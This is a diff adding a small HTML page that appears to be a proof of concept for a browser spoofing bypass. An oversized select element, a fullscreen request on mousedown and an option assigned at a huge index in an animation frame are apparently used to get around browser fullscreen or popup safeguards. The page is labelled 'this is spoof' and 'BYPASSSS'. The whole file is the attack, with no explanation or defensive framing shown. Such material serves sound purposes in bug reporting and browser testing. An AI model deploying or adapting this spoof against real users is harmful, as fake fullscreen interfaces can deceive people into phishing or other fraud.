@@ -1,0 +1,33 @@
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        overflow-y: hidden;
+    }
+
+    select {
+        height: 9999px;
+        width: 9999px;
+        font-size: 9em;
+    }
+</style>
+
+<script>
+    function spoof() {
+        window.requestAnimationFrame(fillSelect);
+        document.documentElement.requestFullscreen();
+    }
+
+    function fillSelect() {
+        
+        selectElement[641811] = optionElement;
+    }
+</script>
+<h1>this is spoof</h1>
+<select id="selectElement" onmousedown="spoof()">
+    <option id="optionElement">
+        BYPASSSS
+    </option>
+</select>
+
